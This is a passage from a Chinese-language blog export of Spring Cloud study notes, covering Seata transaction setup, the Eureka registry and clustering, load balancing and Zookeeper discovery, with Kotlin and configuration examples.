<li>三组件TC，TM，RM<br>TC事务协调者<br>维护全局和分支事务的状态，驱动全局事务提交或回滚。<br>TM事务管理器<br>定义全局事务的范围：开始全局事务、提交或回滚全局事务。<br>RM资源管理器<br>管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</li>
</ol>
<h3 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h3><ol>
<li>TM向TC申请开启一个全局事务，全局事务创建成功并性成一个全局唯一的ID;</li>
<li>XD在微服务调用链路的上下文中传播：</li>
<li>RM向TC注册分支事务，将其纳入ID对应全局事务的管辖；</li>
<li>TM向TC发起针对ID的全局提交或回滚决议；</li>
<li>TC调度XD下管辖的全部分支事务完成提交或回滚请求。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(13)-2023-11-11-19-53.png"></li>
</ol>
<h3 id="下载配置"><a href="#下载配置" class="headerlink" title="下载配置"></a>下载配置</h3><p>（只限于0.9版本以前）<br>下载完成后，先备份<code>file.conf</code>然后再修改该文件 主要修改：自定义事务组名称+事务日志存储模块为db+数据库连接信息</p>
<ol>
<li>service模块：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service &#123;</span><br><span class="line">  #vgroup-&gt;rgroup</span><br><span class="line">  vgroup_mapping.my_test_tx_group = &quot;springcloud&quot;</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>store模块<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">store &#123;</span><br><span class="line">  ## store mode: file、db</span><br><span class="line">  mode = &quot;db&quot;</span><br><span class="line"></span><br><span class="line">  ## file store</span><br><span class="line">  file &#123;</span><br><span class="line">    dir = &quot;sessionStore&quot;</span><br><span class="line"></span><br><span class="line">    # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions</span><br><span class="line">    max-branch-session-size = 16384</span><br><span class="line">    # globe session size , if exceeded throws exceptions</span><br><span class="line">    max-global-session-size = 512</span><br><span class="line">    # file buffer size , if exceeded allocate new buffer</span><br><span class="line">    file-write-buffer-cache-size = 16384</span><br><span class="line">    # when recover batch read size</span><br><span class="line">    session.reload.read_size = 100</span><br><span class="line">    # async, sync</span><br><span class="line">    flush-disk-mode = async</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ## database store</span><br><span class="line">  db &#123;</span><br><span class="line">    ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp) etc.</span><br><span class="line">    datasource = &quot;dbcp&quot;</span><br><span class="line">    ## mysql/oracle/h2/oceanbase etc.</span><br><span class="line">    db-type = &quot;mysql&quot;</span><br><span class="line">    driver-class-name = &quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">    url = &quot;jdbc:mysql://127.0.0.1:3306/seata&quot;</span><br><span class="line">    user = &quot;root&quot;</span><br><span class="line">    password = &quot;123456&quot;</span><br><span class="line">    min-conn = 1</span><br><span class="line">    max-conn = 3</span><br><span class="line">    global.table = &quot;global_table&quot;</span><br><span class="line">    branch.table = &quot;branch_table&quot;</span><br><span class="line">    lock-table = &quot;lock_table&quot;</span><br><span class="line">    query-limit = 100</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>根据conf给你提供的sql建立一个sql数据库</li>
<li>修改register.conf<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registry &#123;</span><br><span class="line">  # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa</span><br><span class="line">  type = &quot;nacos&quot;</span><br><span class="line"></span><br><span class="line">  nacos &#123;</span><br><span class="line">    serverAddr = &quot;localhost:8848&quot;</span><br><span class="line">    namespace = &quot;&quot;</span><br><span class="line">    cluster = &quot;default&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="业务准备"><a href="#业务准备" class="headerlink" title="业务准备"></a>业务准备</h3><p>详细的可以查看脑图文件，见springcloud学习尚硅谷<br><strong>每个库都执行建立一个回滚表</strong><br>![图片上传失败(0)]</p>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(3)</title>
    <url>/posts/33b63f82/</url>
    <content><![CDATA[<h1 id="服务注册中心"><a href="#服务注册中心" class="headerlink" title="服务注册中心"></a>服务注册中心</h1><h2 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h2><p>什么是服务治理？<br>springcloud封装了Netflix公司开发的Eureka模块来实现服务治理</p>
<p>在传统的rpc远程调用框架中，管理每个服务与服务之间依赖关系比较复杂，管理比较复杂。所有要使用夫妇治理，管理服务与服务之间的依赖关系，可以实现服务调用，负载均衡，容错等。实现服务发现和注册。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-11-02-46.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-04-38-02.png"></p>
<h3 id="单机Eureka搭建步骤"><a href="#单机Eureka搭建步骤" class="headerlink" title="单机Eureka搭建步骤"></a>单机Eureka搭建步骤</h3><ol>
<li>构建服务端<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-09-38-22.png"><br>修改pom文件：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        自定义api通用包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.zfxt.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        eureka服务端--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.jetbrains.kotlin/kotlin-reflect --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jetbrains.kotlin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kotlin-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
修改yml文件:<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhsot</span> <span class="comment">#eureka服务端的实例名称</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment">#false 表示不会注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># false表示自己就是注册中心，职责是维护服务实例。不需要检索服务</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://$&#123;eureka.instance.hostnmae&#125;:$&#123;server.port&#125;/eureka/</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>主启动文件：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">EurekaMain7001</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runApplication&lt;EurekaMain7001&gt;(*args)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加注解设置为服务端</span></span><br></pre></td></tr></table></figure>

<h3 id="注册其他服务到eureka中"><a href="#注册其他服务到eureka中" class="headerlink" title="注册其他服务到eureka中"></a>注册其他服务到eureka中</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-16-30-05.png"></p>
<ol>
<li>导包：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        eureka客户端--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>添加yml<blockquote>
<p>这里要注意一个内容：</p>
</blockquote>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-name</span></span><br><span class="line"><span class="comment"># 这里配置的服务名字影响到了后期如何快捷的调用服务和负载均衡</span></span><br></pre></td></tr></table></figure>
<img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-10-39-15.png"></li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment">#true 表示注册自己，默认为true</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 是否从EurekaServer抓取已有的注册信息，默认为true。单节点无所谓，集群必须使用true，并配合ribbon使用负载均衡</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>主启动添加注解：<br><code>@EnableEurekaClient</code></li>
</ol>
<h3 id="Eureka集群"><a href="#Eureka集群" class="headerlink" title="Eureka集群"></a>Eureka集群</h3><p>情景：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-23-31-30.png"><br>实现负载均衡+故障容错<br>集群注册原理：互相注册，相互守望</p>
<p><strong>搭建</strong>：<br>新建module，改pom都没有问题。<br>但是如果需要配置集群的话，需要为两个服务器配置不同的地址和名称，并且相互注册。如下：<br>(前提是你再hosts文件里配置好了eureka7001.com和eureka7002.com的地址都指向了127.0.0.1)</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 7001</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7001.com</span> <span class="comment">#eureka服务端的实例名称</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment">#false 表示不会注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># false表示自己就是注册中心，职责是维护服务实例。不需要检索服务</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7002.com:7002/eureka</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 7002</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7002</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7002.com</span> <span class="comment">#eureka服务端的实例名称</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment">#false 表示不会注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># false表示自己就是注册中心，职责是维护服务实例。不需要检索服务</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure>

<p>然后为其他微服务配置进入这个eureka集群中<br>他与原来的区别只有：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#      defaultZone: http://localhost:7001/eureka</span></span><br><span class="line"><span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka</span> <span class="comment"># 集群版</span></span><br></pre></td></tr></table></figure>
<p>仅此而已</p>
<p><strong>kotlin在springboot中的使用</strong>：<br>需要注意的是，kotlin自身的string字符串中默认就有<code>$</code>内插字符串。所以在使用springboot中的$符号时，需要加上\转义符。例如：<br>文中的@Value(“${server.port}”)是需要添加转义符才能添加进去的。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaymentController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> log = LoggerFactory.getLogger(javaClass)</span><br><span class="line">    <span class="meta">@Value(<span class="string">&quot;\$&#123;server.port&#125;&quot;</span>)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> serverPort:String</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> paymentService: PaymentService</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(<span class="string">&quot;/payment/create&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">create</span><span class="params">(<span class="meta">@RequestBody</span> payment: <span class="type">Payment</span>)</span></span>: CommonResult&lt;<span class="keyword">out</span> <span class="built_in">Int</span>&gt; &#123;</span><br><span class="line">        log.info(<span class="string">&quot;*****插入数据：<span class="variable">$payment</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> result = paymentService.create(payment)</span><br><span class="line">        log.info(<span class="string">&quot;*****插入结果：<span class="variable">$result</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> CommonResult(<span class="number">200</span>, <span class="string">&quot;插入数据成功,服务端口:<span class="variable">$serverPort</span>&quot;</span>, result)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> CommonResult(<span class="number">444</span>, <span class="string">&quot;插入数据失败&quot;</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/payment/get/&#123;id&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getPaymentById</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Long</span>)</span></span>: CommonResult&lt;*&gt; &#123;</span><br><span class="line">        <span class="keyword">val</span> result = paymentService.getPaymentById(id)</span><br><span class="line">        log.info(<span class="string">&quot;*****查询结果：<span class="variable">$result</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> CommonResult(<span class="number">200</span>, <span class="string">&quot;查询数据成功,服务端口：<span class="variable">$serverPort</span>&quot;</span>, result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><ol>
<li>修改服务的调用方式，从固定改为从eureka获取：</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    private val PAYMENT_URL = &quot;http://localhost:8001&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> PAYMENT_URL = <span class="string">&quot;http://CLOUD-PAYMENT-SERVICE&quot;</span></span><br></pre></td></tr></table></figure>
<p>如上<br>2.<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-09-55-27.png"><br>添加注解</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">   <span class="meta">@LoadBalanced</span> <span class="comment">//使用@LoadBalanced注解赋予RestTemplate负载均衡的能力</span></span><br><span class="line">   <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">restTemplate</span><span class="params">()</span></span> = RestTemplate().apply &#123;</span><br><span class="line">       messageConverters.add(<span class="number">0</span>,gsonHttpMessageConverter)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="actuator微服务信息完善"><a href="#actuator微服务信息完善" class="headerlink" title="actuator微服务信息完善"></a>actuator微服务信息完善</h3><ol>
<li>修改主机名称。（让他只暴露服务名称）<br>在eureka中加上instance实例id<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-01-58-33.png"></li>
<li>访问信息有IP地址<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-10-14-32.png"></li>
</ol>
<h3 id="服务发现Discovery"><a href="#服务发现Discovery" class="headerlink" title="服务发现Discovery"></a>服务发现Discovery</h3><p>他可以访问到所有微服务的类型和信息</p>
<ol>
<li>配置<code>@EnableDiscoveryClient</code>注解在主启动类上</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">PaymentMain8001</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>在<code>controller</code>中添加一个client自动注入discoveryClient</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span>  discoveryClient: DiscoveryClient</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置一个get服务测试</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(<span class="string">&quot;/payment/discovery&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">discovery</span><span class="params">()</span></span>:DiscoveryClient&#123;</span><br><span class="line">        <span class="keyword">val</span> services = discoveryClient.services</span><br><span class="line">        services.forEach &#123;</span><br><span class="line">            log.info(<span class="string">&quot;*****element:<span class="variable">$it</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> instances = discoveryClient.getInstances(<span class="string">&quot;CLOUD-PAYMENT-SERVICE&quot;</span>)</span><br><span class="line">        instances.forEach &#123;</span><br><span class="line">            log.info(<span class="string">&quot;*****instance:<span class="subst">$&#123;it.uri&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> discoveryClient</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-12-21-35.png"><br>可以获取所有的微服务信息</p>
</li>
</ol>
<h3 id="Eureka自我保护机制"><a href="#Eureka自我保护机制" class="headerlink" title="Eureka自我保护机制"></a>Eureka自我保护机制</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-19-37-09.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-15-55-34.png"><br>服务端：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-11-26-08.png"><br>客户端：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-04-00-01.png"></p>
<h2 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h2><ol>
<li><p>搭建注册中心<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-02-25-53.png"><br>可以简单的使用docker来搭建，或者直接用服务器<br>这里演示docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取ZooKeeper镜像最新版本</span></span><br><span class="line">docker pull zookeeper:latest</span><br><span class="line"><span class="comment"># 启动docker</span></span><br><span class="line">docker run -d -e TZ=<span class="string">&quot;Asia/Shanghai&quot;</span> -p 2181:2181  --name zookeeper --restart always zookeeper</span><br></pre></td></tr></table></figure>
<p>更多关于zookeeper的内容可以查看该<a href="https://juejin.cn/post/7103406988079398942">文章</a></p>
</li>
<li><p>建module</p>
</li>
<li><p>改pom<br>去除掉eureka的包，导入zookeeper包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>改yam</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务别名,注册zookeeper到注册中心名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-payment</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="string">localhost:2181</span></span><br></pre></td></tr></table></figure></li>
<li><p>然后添加discoveryClient用来获取微服务信息：</p>
</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;discoveryClients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;serviceDiscovery&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;zookeeperDiscoveryProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;hostInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;override&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ipAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.200.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;root&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/services&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;uriSpec&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;scheme&#125;://&#123;address&#125;:&#123;port&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;instanceHost&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;instanceIpAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.200.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;preferIpAddress&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;register&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;initialStatus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UP&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;simpleDiscoveryProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;instances&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;local&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://localhost:8004&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8004</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;secure&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;serviceId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cloud-provider-payment&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

